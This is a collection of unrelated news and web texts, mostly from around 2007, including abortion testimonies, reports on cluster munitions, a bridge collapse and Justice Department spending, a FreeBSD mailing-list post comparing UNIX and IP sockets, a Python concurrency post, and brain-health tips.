Andrew and I had been together for two years when I realised I was expecting , but neither of us felt ready for a baby .
I 'd come off the pill because it was giving me really bad mood swings and we were using condoms .
When one burst , I thought I could never be that unlucky .
Initially , I hoped my period was just late because I 'd been stressed .
When the test was positive , I felt physically sick .
Sitting on the bathroom floor in tears , Andrew and I had the worst conversation we 'd ever had .
Instinctively , I knew that I was n't ready for motherhood .
Andrew was willing to go ahead , but when I told him I wanted to have an abortion , I think he was relieved .
The following day , I went to see my GP and was booked in for my termination at a Central London NHS hospital .
I had a vacuum aspiration abortion when I was six weeks pregnant .
In my mind , it was not a proper baby yet so I did n't feel like I was killing something .
Now , when I hear how babies can have a heartbeat at six weeks , it does upset me .
The procedure was done under general anaesthetic so I did n't feel a thing .
I do n't feel guilty , and I justify it by saying to myself that I only have one life and I can't give up my own happiness and dreams for the sake of a baby .
The strain of such a serious event made our relationship difficult for a few months , but now Andrew and I are closer than ever .
I know we will stay together and one day have another baby - but it will happen when the time is right .
I think the limit should stay where it is because I believe that women do have the right to choose .
In my opinion , it 's not a fully formed baby until it is born at full term .
Until then , the mother 's wishes must come first .
REGRETS
Sarah Fry , 27 , is an import clerk at Heathrow Airport .
She lives in Stanwell , Middlesex , with her boyfriend Martin , 30 , a prison officer , and their daughter , Tayla , five weeks .
Sarah says :
The abortion laws should be changed so that it 's more difficult to have one .
I was 18 when I went to my doctor and asked for an abortion .
I 'd only been with my boyfriend for a month .
No obstacles were put in my way , and the whole process was so incredibly quick and smooth that I never really had the chance to think if it was something I really wanted to go through with .
A 13 - week limit makes much more sense when you consider that babies born prematurely at 24 weeks are surviving .
It does make it very hard to justify late abortions .
My abortion haunted me for years afterwards .
I split up with the boyfriend I 'd been with then , but when I met Martin and we started trying for children it took almost a year for me to conceive .
Then , at seven weeks , I had a miscarriage .
I tried not to think about the abortion , but in January 2006 , when we lost another baby at seven weeks , I was inconsolable .
In fact , I suffered two more miscarriages before getting pregnant with Tayla in December 2006 .
When she was born in August of this year , I was thrilled - but when I look at her I sometimes think of the pregnancy I terminated .
Doctors have n't confirmed a link between my abortion nine years ago and the subsequent miscarriages , but I can't help but wonder if they 're connected - and inside I do sometimes blame myself .

Varria Russellwhite , 34 , is an education officer for a charity .
She lives with her husband and their three children aged seven , five and one in Sheffield .
Varria had an abortion nine years ago at the age of 24 .
She says :
I was in my final year at college in Leicester with big hopes of going to university and becoming a journalist .
I met my present husband through a summer job and we quickly became best friends .
There was no romance between us then , but one night we were fooling around and one thing led to another .
The sex was so spontaneous that we did n't think to use any contraception .
Several days later , my body felt different .
I did a test and when the blue line appeared my heart sank and I thought : " Oh God , what have I done . "
I hated myself because I had let my family down .
I booked an appointment with my GP for the following day .
The three days waiting for the test results were the longest in my life , and when it came back positive I burst into tears .
Having an abortion was the last thing on my mind .
All I could think of was how I would tell my parents and the father of my child .
I told Martin first .
It was a massive relief that he would stand by me , and that night I told my family .
I could barely get the words out - I was so disappointed with myself .
The next day , I booked an abortion at Leicester General Hospital , by which time I would be 12 weeks pregnant .
But on the morning I was supposed to be at the hospital , I froze .
Every part of my body was saying no , so I cancelled .
I thought I 'd be happy at my decision , but then my career dreams started to creep back and a month later I rebooked .
I was 17 weeks pregnant when I finally went through with it .
I was given a pill and then a pessary the following day , which induced a miscarriage .
I was not prepared for what followed .
After eight hours I gave birth to a small but fully formed baby .
As I watched the nurse carry it away in a pool of blood , I felt so hollow at the waste of a life .
I could clean the mess off me , but could n't wash the guilt from my mind .
I fell out with my baby 's father because he did n't want me to have the abortion .
He moved away to do an MA and I went to university .
A year later , I ran into him by chance .
Time had healed some wounds and we were able to talk about what happened .
Over the next few months we really did fall in love and I knew I wanted a baby with him .
Our first son was born in 2000 and we were married the following year .
I have the perfect little family now , although I always wonder what could have been .
I think the Government should change the laws to make the upper limit of abortion at 13 weeks .
If I had n't been allowed to have an abortion when I did , it would have forced me to come to a decision earlier and that would have made the procedure less traumatic .
REGRETS
Sue Hulbert , 45 , a science teacher from Leeds , had an abortion in 2000 .
She has two children aged 16 and 12 .
She says :
In 1999 , my 11 - year marriage broke down and we decided to separate .
I quickly fell for one of the mature students in my university lecture group .
Alan was everything my husband was n't and I felt I 'd met my soul mate .
Things moved very quickly .
Being 38 , it was probably my last chance to have a baby and it did n't take me long to get pregnant .
In February 2000 , I announced the good news .
But Alan 's reaction was n't quite what I expected .
He hardly said a word .
I felt so confused and hoped it was just an initial reaction .
But the wall between us just got thicker and we ended up splitting up on Easter Sunday .
I was due for a scan two days later , but now I was thinking about an abortion .
Alan came with me to the appointment , but before the scan I broke down in front of the nurse .
" I want to talk about terminating this pregnancy , " I sobbed .
I explained that I could n't cope - my marriage had broken down , the man of my dreams was n't who I had thought he was and I had two young children to look after .
After a week to think things over , I decided to book an abortion .
I was 14 weeks pregnant .
The ten days leading up to it were terrifying .
I could n't sleep , and I was irritable all the time , trying not to think about what I was going to do .
Alan drove me to the hospital and I cried all the way there .
As the nurse explained how they would put me under anaesthetic while they sucked the baby out , I was shaking .
Seeing how distressed I was , she told me : " I 'm going to give you an hour to have a think about whether you really want this . "
I cried non -stop for that hour but I could n't find the words to say no , so I went through with it .
When I came to , I felt devastated about what I had done and immediately regretted it .
I went home with this aching , empty feeling .
Alan did n't wait long before cutting his ties with me and I fell into a deep depression .
It took me so long to get out of bed each morning because I had to imagine I was dressing and feeding my lost baby .
I gave him a name , Patrick .
One night , I wrote letters to my family and friends and took an overdose of antidepressants .
But it was n't enough - and the next day I was woken by the phone .
It was Alan , who realised I could barely speak and called an ambulance .
With counselling , things gradually got better .
Not a day goes by , though , when I do n't regret my abortion .
I hope the Government drops the limit for abortions right down .
At all stages of pregnancy it is a human life - but at 24 weeks it can survive out of the womb .
NO REGRETS
Ruth Teddern , 55 , lives in North West London and works as a receptionist in a young people 's health clinic .
She has no children .
She says :
I never wanted children , so when I fell pregnant at 30 , despite using the contraceptive coil , I was in shock .
I 'd been involved in Pro-Choice campaigning , so was clear that I would have an abortion .
My boyfriend and I had barely been together five minutes and I 'd just recovered from a bout of clinical depression .
Fortunately , my boyfriend , who was eight years younger than me , believed it was a woman 's right to choose , so at eight weeks pregnant I had a termination .
The day was tinged with sadness but my boyfriend 's support proved that here was a man I could rely on .
We spent another 15 years together , and throughout that time neither of us regretted my decision .
Nor did we have any desire subsequently to have children .
I believe strongly that the Government 's desire to reduce the time limit on abortions is foolish and ill - informed , and will catch out the most vulnerable women .
Only a very tiny percentage of abortions are carried out at over 20 weeks - but the women who have them need that time frame as a safety net .
They are often young girls who are too scared to tell their parents they are pregnant .
The MoD last year described the Hydra CRV - 7 system , which delivers a number of bomblets from a helicopter - mounted rocket pod , as a cluster weapon .
Later in the year , Margaret Beckett , then foreign secretary , said the government did not consider the weapon fell within the term " dumb " , because virtually all the bomblets exploded on impact .
Des Browne , the defence secretary , announced earlier this year he had banned the use by Britain 's armed forces of " dumb " cluster bombs .
He said Britain would deploy only cluster bombs which had a self - destruct mechanism .
In July , Bob Ainsworth , the armed forces minister , told MPs the CRV - 7 , equipped with " multi- purpose submunitions " fired from Apache helicopters , did not after all fall within the government 's " understanding of a cluster munition " .
Cluster munitions release smaller " bomblets " when fired , posing a danger to civilians during and long after a conflict .
Unexploded " bomblets " maim and kill civilians in Afghanistan , Iraq and Lebanon .
Mr Ainsworth said in July CRV - 7 bombs were not now cluster weapons because of " direct fire capabilities " and because they had " too few submunitions " .
However , the MoD admitted trials in the US had revealed a 6 % failure rate .
Though the MoD says the CRV - 7 bomb has nine submunitions , critics say today it is a 19 - rocket pod , with 171 submunitions in all .
The reclassification is attacked today by Oxfam , Amnesty International , Human Rights Watch and Landmine Action , who also say that Britain has been the world 's third largest user of lethal cluster bombs over the last 10 years .
" Ten years after it championed a treaty banning landmines , the UK has a chance to do the same with cluster bombs - but instead it is spinning a cluster bomb con , " said Simon Conway , Director of Landmine Action .
Tom Porteous , London director of Human Rights Watch , said : " Our investigations in Kosovo , Afghanistan , Iraq and Lebanon have all shown that cluster munitions , no matter how sophisticated , do not work as advertised , and instead get used in ways that violate international humanitarian law . "
In February 2007 , Britain joined 46 other countries in calling for a worldwide ban on cluster bombs .
This initiative , the Oslo Process , is expected to lead to a treaty next year , the humanitarian groups say .
Anna MacDonald of Oxfam said : " Current UK policy on cluster bombs makes no sense .
They say they want an international treaty but they also want to keep using cluster bombs well known to kill and injure civilians . "
Britain also has in its armoury artillery - delivered M85 cluster bomblets which are supposed to self - destruct if they do not explode on impact .
A Commons foreign affairs committee report estimated that the weapons had a 10 % failure rate .
" Despite being the third biggest user of cluster bombs in the world over the last 10 years , the government has n't made any efforts to asses the harm these weapons cause to civilians , " said Oliver Sprague of Amnesty International .
In a statement last night , the MoD said : " The UK is committed to improving reliability of all munitions , including cluster munitions , with the aim of achieving lower failure rates and leaving less unexploded ordnance .
There is no internationally recognised definition for cluster munitions . "
The statement added that an MoD assessment concluded " direct fire munitions " should not be classed as cluster weapons and that was the view shared by the Red Cross ; " direct fire " normally means the gunner can see the intended target .

Facebook Ana's Story : A Journey of Hope by Jenna Bush , one of the president 's 25 - year - old twin daughters , describes a teenage single mother in Panama who has survived enough heartbreak to rival Job in the Old Testament .
The non-fiction book aimed at teens is based on Bush 's work as an UNICEF intern .
It can be read as a primer that deals with questions such as the use of condoms to prevent sexually transmitted diseases , but ultimately , Bush 's narrative is too earnest for its own good .
Ana , identified only by her first name , is a 17 - year - old orphan who was born with HIV .
Her first memory , at age 3 , is being told her 2 - month - old sister had died , probably of AIDS , Ana later learns .
Ana 's parents also died of AIDS .
Ana is beaten by her grandmother and molested by her grandmother 's boyfriend .
At 10 , she 's told she has HIV and must keep it a secret .
But in the book 's preface , Bush describes a meeting of women and children with HIV or AIDS in which Ana , at 17 , declares : " We are not dying with AIDS .
We are living with it .
We are survivors . "
Based on six months of conversations that followed , Bush has drawn what she calls a " mosaic " of a life , " using words instead of shards of broken tile . "
The book is easy to read .
It 's divided into 102 chapters , some as short as two sentences , and is illustrated with 49 subtle photographs by UNICEF intern Mia Baxter .
It will be most valuable to teens who harbor their own damaging secrets or have n't thought about what it 's like to be one of the 2.3 million children in the world with HIV or AIDS .
Included are 35 pages on information sources and addressing myths such as " You can get HIV from kissing . "
The format is an awkward hybrid : not quite an " as - told - to " story but written in the third person .
Ana 's voice rarely punches through .
The addendum advises : " If you decide abstinence is right for you , do n't let anyone tell you otherwise . …
If you decide that you 're ready for a sexual relationship , the best way to protect yourself … is to be faithful to your partner and use a condom every time .
No exceptions — ever . "
The book tells an important story , but it ignores the debate over how much U.S. support should go to organizations that distribute condoms as opposed to conservative religious groups that promote only abstinence .

If those who designed the bridge in 1964 miscalculated the loads and used metal parts that were too weak for the job , it would recast the national debate that has emerged since the collapse a week ago , about whether enough attention has been paid to maintenance , and raises the possibility that the bridge was structurally deficient from the day it opened .
It does not explain , however , why the bridge stood for 40 years before collapsing .
In an announcement , the safety board said its investigators were “ verifying the loads and stresses ” on the plates as well as checking what they were made of and how strong they were .
State authorities here said the plates were made of steel , and were , in most such bridges , shaped like squares , 5 feet by 5 feet , and a half - inch thick .
Such plates are common in bridge construction as a way to attach several girders together , said Jan Achenbach , an expert in testing metals at the Northwestern University Center for Quality Engineering and Failure Prevention .
A consultant hired by the state of Minnesota in the days after the collapse to conduct an investigation of what had gone wrong , even as the national safety board did its work , first discovered the potential flaw , the board said .
Representatives at Wiss , Janney , Elstner Associates Inc. , the consulting firm , could not be reached late today .
Federal authorities indicated that one added stress on the gusset plates may have been the weight of construction equipment and nearly 100 tons of gravel on the bridge , where maintenance work was proceeding when the collapse occurred .
A construction crew had removed part of the deck with 45 - pound jack hammers , in preparation for replacing the 2 - inch top layer , and that may also have altered the stresses on the bridge , some experts said .
The chairman of the National Transportation Safety Board , Mark V. Rosenker , said Sunday that investigators were calculating the stresses generated on each girder and other bridge components from the construction equipment and materials .
While cautioning other states today about the weight of construction equipment and materials , the federal Transportation Department did not immediately issue any broader warnings about gusset plates .
Brian Turmail , a spokesman for the Transportation Department , said this evening that his agency was “ conducting additional analysis to determine whether we need to ask the states to do checks of their designs . ”

WASHINGTON ( CNN ) --
Hungry attendees at Justice Department conferences have been enjoying millions of dollars in meatballs and other goodies courtesy of U.S. taxpayers , according to an inspector general 's report released Friday .
The Justice Department paid more than $ 13,000 for cookies at conferences , says a report released Friday .
The report cited $ 5 meatballs and cans of soft drinks each costing $ 4.55 among reasons 10 conferences during 2005 and 2006 cost nearly $ 7 million .
One four - day conference of 1,500 people in Los Angeles cost the Justice Department $ 394,000 in August 2005 .
" Overall this conference 's daily food expense averaged $ 64 per registrant , which exceeded the approved federal per diem rate of $ 51 for meals , " the report said .
The 128 - page report does not suggest laws were broken , although it questions the Justice Department 's judgment when it comes to the cost of its events .
In addition to the platters of Swedish meatballs and soda pop , the Justice Department paid more than $ 13,000 for cookies , according to the inspector general 's office .
A Senate committee requested the report on Justice Department conferences , which , in fiscal year 2006 , cost taxpayers nearly $ 46 million , including travel , programming , food and associated costs .
Year to year costs show such meetings have totaled from $ 33.8 million in 2001 to a high of $ 58 million in 2004 .
The report reviewed the nine most expensive U.S. conferences between October 2004 and September 2006 and the most expensive international conference during that same time .
The 2005 Los Angeles event -- which was called the " Weed and Seed " national conference -- attracted particular attention from the audit 's authors .
It " included a $ 53 per person two - entree and dessert lunch for 120 attendees , a one - hour $ 64,000 ' Stars and Stripes ' themed networking reception and a post - conference meeting for 30 DOJ employees who were provided a sandwich buffet lunch at a cost of $ 44 per person and an ' At the Movies ' theme snack ( candy , popcorn , and soft drinks ) for an additional $ 25 per person , " the report said .
The report , from the Office of Inspector General , Glenn Fine , expressed concern that most of the conference attendees failed to deduct their allowable per diem meal costs because they received free meals .
" When component managers do not systematically review vouchers to ensure that such deductions are made , the government effectively pays for the meals twice , " the report said .
Another meeting detailed in the report was a 2006 COPS National Conference in Washington .
Some 1,100 attendees were offered daily breakfast buffets , two lunches , a networking reception , and two " themed breaks . "
" The networking reception itself cost more than $ 60,000 and included a chef - carved roast beef and turkey , a penne pasta station , and platters of Swedish meatballs at a cost of nearly $ 5 per meatball , " the report said .
" The average food and beverage cost per day for the COPS conference was $ 83 per attendee -- $ 19 dollars over the $ 64 federal per diem meal rate for Washington . "
Among the report 's recommendations : Planners should compare costs in multiple sites in multiple cities unless there is a special reason a meeting needs to be held in a particular city .
The report also called for developing conference food and beverage policies " to ensure adequate justification of significant food and beverage costs . "
The Justice Department said it agreed with the recommendations .

unix domain sockets vs. internet sockets
On Fri , 25 Feb 2005 , Baris Simsek wrote : >

Could you compare ip sockets and unix domain sockets ?
My > main criterions are performance and protocol load .

There are a few differences that might be of interest , in addition to the already pointed out difference that if you start out using IP sockets , you do n't have to migrate to them later when you want inter-machine connectivity : - UNIX domain sockets use the file system as the address name space .
This means you can use UNIX file permissions to control access to communicate with them .
I.e. , you can limit what other processes can connect to the daemon -- maybe one user can , but the web server can't , or the like .
With IP sockets , the ability to connect to your daemon is exposed off the current system , so additional steps may have to be taken for security .
On the other hand , you get network transparency .
With UNIX domain sockets , you can actually retrieve the credential of the process that created the remote socket , and use that for access control also , which can be quite convenient on multi-user systems .
- IP sockets over localhost are basically looped back network on - the - wire IP .
There is intentionally " no special knowledge " of the fact that the connection is to the same system , so no effort is made to bypass the normal IP stack mechanisms for performance reasons .
For example , transmission over TCP will always involve two context switches to get to the remote socket , as you have to switch through the netisr , which occurs following the " loopback " of the packet through the synthetic loopback interface .
Likewise , you get all the overhead of ACKs , TCP flow control , encapsulation / decapsulation , etc .
Routing will be performed in order to decide if the packets go to the localhost .
Large sends will have to be broken down into MTU - size datagrams , which also adds overhead for large writes .
It 's really TCP , it just goes over a loopback interface by virtue of a special address , or discovering that the address requested is served locally rather than over an ethernet ( etc ) .
- UNIX domain sockets have explicit knowledge that they 're executing on the same system .
They avoid the extra context switch through the netisr , and a sending thread will write the stream or datagrams directly into the receiving socket buffer .
No checksums are calculated , no headers are inserted , no routing is performed , etc .
Because they have access to the remote socket buffer , they can also directly provide feedback to the sender when it is filling , or more importantly , emptying , rather than having the added overhead of explicit acknowledgement and window changes .
The one piece of functionality that UNIX domain sockets do n't provide that TCP does is out - of - band data .
In practice , this is an issue for almost noone .
In general , the argument for implementing over TCP is that it gives you location independence and immediate portability -- you can move the client or the daemon , update an address , and it will " just work " .
The sockets layer provides a reasonable abstraction of communications services , so it 's not hard to write an application so that the connection / binding portion knows about TCP and UNIX domain sockets , and all the rest just uses the socket it 's given .
So if you 're looking for performance locally , I think UNIX domain sockets probably best meet your need .
Many people will code to TCP anyway because performance is often less critical , and the network portability benefit is substantial .
Right now , the UNIX domain socket code is covered by a subsystem lock ; I have a version that used more fine - grain locking , but have not yet evaluated the performance impact of those changes .
I 've you 're running in an SMP environment with four processors , it could be that those changes might positively impact performance , so if you 'd like the patches , let me know .
Right now they 're on my schedule to start testing , but not on the path for inclusion in FreeBSD 5.4 .
The primary benefit of greater granularity would be if you had many pairs of threads / processes communicating across processors using UNIX domain sockets , and as a result there was substantial contention on the UNIX domain socket subsystem lock .
The patches do n't increase the cost of normal send / receive operations , but due add extra mutex operations in the listen / accept / connect / bind paths .

Mr Bush called for more time to complete the task in Iraq Bush speaks on Iraq
Send us your comments
" The price of America 's withdrawal was paid by millions of innocent citizens , " he told war veterans in Missouri .
Mr Bush said the Vietnam War had taught the need for US patience over Iraq .
His speech comes amid an apparent rift with Iraqi Prime Minister Nouri Maliki , but Mr Bush said Mr Maliki was a " good man with a difficult job " .
Hours earlier , Mr Maliki called recent US criticism of his work " discourteous " .
The White House was swift to respond , saying in a statement that Mr Bush still believes that Mr Maliki is the right person to lead Iraq .
THE VIETNAM WAR Ran from 1959 - 1975 Democratic Republic of Vietnam ( North Vietnam ) defeated US - backed Republic of Vietnam ( South Vietnam ) Estimated four million Vietnamese civilians killed 1.1 million communist fighters killed 200 - 250,000 South Vietnamese troops killed 58,200 US troops killed or missing in action
Choosing Vietnam lessons
In quotes : Bush speech
Why the US is unhappy
Mr Bush began his speech at the annual convention for the Veterans of Foreign Wars ( VFW ) group , in Kansas City , by flagging up US successes in staying the distance in other conflicts - particularly in turning Japan from an enemy into a key ally .
" The ideals and interests that led America to help the Japanese turn defeat into democracy are the same that lead us to remain engaged in Afghanistan and Iraq , " Mr Bush said .
" The defence strategy that refused to hand the South Koreans over to a totalitarian neighbour helped raise up an Asian Tiger that is a model for developing countries across the world , including the Middle East . "
Legacy of defeat
Mr Bush compared current calls for withdrawal from Iraq with what happened at the end of the Vietnam War in 1975 .
" Many argued that if we pulled out , there would be no consequences for the Vietnamese people , " Mr Bush said .
" The world would learn just how costly these misimpressions would be .
Mr Bush spoke of the massacres under Cambodia 's Khmer Rouge
" Whatever your position in that debate , one unmistakable legacy of Vietnam is that the price of America 's withdrawal was paid by millions of innocent citizens , " Mr Bush said , mentioning reprisals against US allies in Vietnam , the displacement of Vietnamese refugees and the massacres in Cambodia under Pol Pot 's Khmer Rouge .
He warned that in Iraq there was the added danger that a US withdrawal would signal victory for al - Qaeda , emboldening its leaders and drawing in new recruits .
Short - term problem
BBC world affairs correspondent Nick Childs says Mr Bush 's speech will fuel the controversy over whether he is drawing the right or wrong lessons from history .
Opinion polls suggest that many Americans clearly do not see the stakes or the struggle in the same way , our correspondent says .
Mr Bush is pressing home these broad themes even more forcefully than before because he faces a very specific short - term political problem , with less than 18 months left as president .
Whether his successor will see things in the same ideological and historic terms is , at the very least , open to question , our correspondent adds .
In other news in Iraq :
Fourteen US soldiers were killed when a Black Hawk helicopter in which they were travelling crashed in northern Iraq .
The military said a mechanical fault was to blame .
At least 24 people were killed and 50 injured when a suicide bomber rammed a fuel tanker into a police station in the northern oil city of Baiji .
The deputy US commander in Iraq told the BBC that the US had recruited 20,000 civilian volunteers to act as local police in sensitive areas of the country .
' Seeking friends elsewhere '
Mr Bush 's speech came as Mr Maliki was moved to defend his administration in the face of US criticism .
" No - one has the right to place timetables " on the Iraqi government 's performance Mr Maliki said , blaming the US presidential election campaign for many of the negative comments being made .
The Bush administration has called on Mr Maliki 's cabinet to perform
After Mr Bush 's latest address , in which he praised the Iraqi prime minister , a spokesman for Mr Maliki said they welcomed the president 's comments :
" His speech yesterday was a bit ambiguous and confusing , but he clarified things in his speech today , " the spokesman told the BBC .
" Mr Maliki said in Syria that he agrees with President Bush that the people of Iraq have the final say in changing their government .
So our reaction is positive . "
On Tuesday , Mr Bush had appeared to distance himself from Mr Maliki 's government for the first time .
Mr Bush said the people of Iraq had made a great step towards reconciliation .
However he added that there was " a certain level of frustration with the leadership " of Mr Maliki and that his government now had to perform .
SAN FRANCISCO ( MarketWatch ) --
Amid the market turmoil this morning , I 'm having a flashback featuring headlines from Wall Street analyst reports written earlier this decade .
For about 18 months beginning in late March 2000 , frantic tech analysts spent long hours writing lengthy reports on overpriced tech stocks .
The arguments were often so defensive they seemed written for the sole purpose of convincing retail investors that all of the previous reports they 'd written were n't filled with nonsense , or worse .
But of course they were , and all the detailed analyses based on confusion , illusion and fiction were overwhelmed by the reality of the Nasdaq slide that wiped out tens of millions of investor portfolios .
If you think " fiction " is too strong a word , remind yourself why former Merrill Lynch analyst Henry Blodget was barred for life from the securities industry , and why the biggest Wall Street investment banks eventually paid out billions of dollars in fines and settlement costs to the SEC and investors .
They did it because the SEC found that their research was filled with conflicts of interest , because the banks did business with the companies whose stocks they often touted .
In many cases , the banks had taken the upstart firms public .
The report that triggered the flashback Friday concerned Countrywide Financial Corp. , the nation 's No. 1 mortgage lender , which said in a filing that the current lack of liquidity in the secondary mortgage market , if it persists , could pose a threat to its finances .
The company said the conditions of that market are " unprecedented . "
What 's happened is that the investment banks , hedge funds and other investors who used to buy and package its home loans have virtually stopped doing business with them .
So great is the threat to market liquidity that the U.S. Federal Reserve and some foreign central banks have pumped more than $ 200 billion into them in the last two days .
Amid this turmoil comes a report from an analyst at , you guessed it , Merrill Lynch , which advises investors to accumulate the shares on any price weakness .
The report had a headline that read " media fanning the flames in an already skittish market " and argued that Countrywide " will ultimately benefit from the disruption , with fewer competitors and disciplined underwriting . "
As proof of the company 's strong position , the analyst cites the fact that Countrywide was able to buy assets of a smaller rival for pennies on the dollar .
Let me see if I 've got this right : Merrill and other investment banks are no longer buying what Countrywide is selling , and a competitor in the same market has assets that are worth a fraction of what they valued them at not long ago , but Merrill analyst Kenneth Bruce is saying that now is the time to buy the company 's shares ?
All of this is a long way of saying that , in these times , any investor who buys a financial - services stock based on the opinion of an investment bank research analyst has to be mad .
Countrywide CFC , might well survive , but the risks of the business it is in are now being repriced , and five - year bull markets driven by speculative risk - takers take years to correct themselves , not weeks or months .
So what to do ?
As someone who believes you should always pair dire warnings with hopeful advice , here 's an idea about what to do right now :
Hold your Google Inc. GOOG , +0.32 % , Cisco Systems Inc. CSCO , - 0.17 % and other tech issues .
If you 've got strong nerves , you may even consider buying them .
This plug may come as a shock to readers who 've read all the columns I 've written over the last two years taking these companies to task for various reasons , including Cisco 's failure to pay a dividend while its stock was moribund for years and Google 's willingness to work with Chinese Internet police .
But let 's face it , folks , we 're talking about protecting your money right now , and these two companies are firing on all cylinders and operating in an industry that , compared to other sectors like retail , is less likely to be touched by the mortgage - led meltdown .
" Tech firms do n't have much exposure to the subprime mess , " said Romeo Dator , co-manager of the All - American Equity Fund from U.S. Global Investors .
" In that sense , it is a safe haven , " said Dator , whose $ 24 million fund owns Google and Cisco .
The fund also owns Internet hardware stocks such as Juniper Networks Inc. JNPR , - 0.54 % , Ciena Corp. CIEN , +0.52 % and Akamai Technologies AKAM , +0.21 % .
A lot of corporations and Internet service providers cut back on investing in technology in the wake of the tech bust and are still catching up , said Dator , whose firm manages $ 4.5 billion .
The other good thing about the tech sector is that it is mostly debt - free .
If anything , tech firms are over - capitalized , which is why they 've been using their huge cash piles to buy back stock during the last few years .
Tech firms do n't have to borrow to fund their growth , which means they are n't likely to get hurt if corporate credit standards tighten .
" The big bubble right now is in leveraged issues , " said Frank Husic , chief investment officer of Husic Capital Management , a San Francisco firm that manages $ 600 million .
On the other hand , in technology , " you 've got a whole industry with pristine balance sheets , " said Husic , whose firm owns Cisco , Apple Inc. AAPL , - 0.75 % , Hewlett - Packard Co. HPQ , +0.31 % and Intel Corp. INTC , - 0.46 %
Husic " is n't looking for these stocks to go up a lot until the smoke clears , " but he does think they will perform well relative to other sectors .
It 's true that consumer - focused firms like Apple could see some " knock - on effects " if a credit crunch restrains spending , Husic said .
Yet he 's confident enough in Cisco , which he 's owned for more than two years , that he added to his position on Thursday .
" There 's a strong case to be made for tech right now , " he said .
The demonstrators took French restiveness to extremes
Parodying the French readiness to say " non " , the demonstrators in the western city of Nantes waved banners reading : " No to 2007 " and " Now is better ! "
The marchers called on governments and the UN to stop time 's " mad race " and declare a moratorium on the future .
The protest was held in the rain and organisers joked that even the weather was against the New Year .
The tension mounted as the minutes ticked away towards midnight - but the arrival of 2007 did nothing to dampen their enthusiasm .
The protesters began to chant : " No to 2008 ! "
They vowed to stage a similar protest on 31 December 2007 on the Champs - Elysees avenue in Paris .
via Bill de hÓra , I ran across this thread on LtU wherein Peter Van Roy comments :
The real problem is not threads as such ; it is threads plus shared mutable state .
To solve this problem , it 's not necessary to throw away threads .
It is sufficient to disallow mutable state shared between threads ( mutable state local to one thread is still allowed ) .
... and Allan McInnes adds :
The " problem with threads " lies in the current approach to sharing state by default , and " pruning away nondeterminism " to get a correctly functioning system .
... and " dbfaken " adds :
Perhaps we should have strong syntax distinctions for mutation .
Since the first versions of Dejavu ( my Python mediated - DB / ORM ) , I 've noticed that this " pruning away nondeterminism " approach is exactly the wrong direction for systems which are designed to be thread - safe ; we could instead explore languages and systems which allow us to " prune away determinism " .
By that I mean , mutable state should not be shared between threads by default ; any mutable state which needs to be shared should be explicitly declared as such .
This would make systems like Dejavu much simpler to create , use , and maintain .
I 've often wondered what a " strong syntax distinction for [ shared ] mutation " would look like in Python .
The simplest solution would probably have to :
Make class.__dict__ 's immutable .
This is a natural choice given the normal usage patterns of classes by developers in the wild : generally , a class exists to share methods between instances .
There are valid use cases for classes which are mutable , but they are rare ; perhaps a sentinel of some kind provided by object could re-enable mutability for classes , but it should be off by default .
Make all module .__dict__ 's immutable .
This has already been suggested on python - dev ( IIRC by GvR himself ) , although I believe it was suggested as a way to reduce monkeypatching .
Provide a @shared annotation for explicitly declaring shared mutable data .
This is just one solution to a small set of use cases : threaded programs where the explicit shared state is small compared to the total lines of code .
I have n't the experience to state whether such a model is inherently damaging to other concurrent needs and designs .
It has the benefit , however , of having little impact on single - threaded programs .
Would such a feature help catapult Python into the " large systems " space ?
Let ’s review some good lifestyle options we can all fol­low to main­tain , and improve , our vibrant brains .
1. Learn more about the “ It ” in “ Use It or Lose It ” .
A basic under­stand­ing will serve you well to appre­ci­ate your brain ’s beau­ty as a liv­ing and con­stant­ly - devel­op­ing dense for­est with bil­lions of neu­rons and synaps­es .
2 . Take care of your nutri­tion .
Did you know that the brain only weighs 2 % of body mass but con­sumes over 20 % of the oxy­gen and nutri­ents we intake ?
As a gen­er­al rule , you do n’t need expen­sive ultra-sophis­ti­cat­ed nutri­tion­al sup­ple­ments , just make sure you do n’t stuff your­self with the “ bad stuff . ”
3 . Remem­ber that the brain is part of the body .
Things that exer­cise your body can also help sharp­en your brain : phys­i­cal exer­cise enhances neu­ro­ge­n­e­sis , at any age !
4. Prac­tice pos­i­tive , action - ori­ent­ed thoughts until they become your default mind­set and you look for­ward to cre­at­ing some­thing beau­ti­ful every new day .
Too much stress and anxiety –either induced by exter­nal events or by your own thoughts–actually kills neu­rons and pre­vent the cre­ation of new ones .
5. Thrive on Learn­ing and Men­tal Chal­lenges .
The point of hav­ing a brain is pre­cise­ly to learn and to adapt to chal­leng­ing new envi­ron­ments .
Once new neu­rons appear in your brain , where they migrate and how long they sur­vive depends on how you use them .
“ Use It or Lose It ” does not mean “ do cross­word puz­zle num­ber 1,234,567 ” .
It means , “ chal­lenge your brain , and often , with nov­el activ­i­ties ” .
6 . We are ( as far as we know ) the only self - direct­ed organ­isms in this plan­et .
Aim high .
Once you grad­u­ate from col­lege , keep learn­ing .
Once you become too com­fort­able in one job , find a new one .
The brain keeps devel­op­ing ALWAYS , reflect­ing what you do with it .
7. Explore , trav­el .
Adapt­ing to new loca­tions forces you to pay more atten­tion to your envi­ron­ment .
Make new deci­sions , use your brain .
8. Do n’t Out­source Your Brain .
Not to media per­son­al­i­ties , not to politi­cians , not to your smart neigh­bour …
Make your own deci­sions , and mis­takes .
That way , you are train­ing your brain , not your neigh­bour’s .
9. Devel­op and main­tain stim­u­lat­ing friend­ships .
We are social ani­mals , and need social inter­ac­tion .
Which , by the way , is why ‘ Baby Ein­stein ’ or all those edu­ca­tion­al apps have been shown not to be the panacea for chil­dren devel­op­ment .
10 . Laugh .
Often .
Espe­cial­ly to cog­ni­tive­ly com­plex humor , full of twists and sur­pris­es .
Bet­ter , try to become the next Jon Stew­art .
Now , remem­ber that what counts is not read­ing this arti­cle –or any oth­er– but prac­tic­ing a bit every day until small steps snow­ball into unstop­pable , inter­nal­ized habits .
“ Cells that fire togeth­er wire togeth­er ” … so , start work­ing on one of these 10 habits today .
Revis­it the habit above that real­ly grabbed your atten­tion , and make a deci­sion to try some­thing dif­fer­ent right away .

President Bush still does not know who actually controverted his policy on keeping Saddam 's military intact and instead disbanded it .
That 's an incredible admission -- unbelievable !
This from a revealing New York Times piece today on Bush biographer Robert Draper 's interviews with Bush ( and in his forthcoming book Dead Certain : The Presidency of George W. Bush ) :
Mr. Bush acknowledged one major failing of the early occupation of Iraq when he said of disbanding the Saddam Hussein - era military , “ The policy was to keep the army intact ; did n’t happen . ”
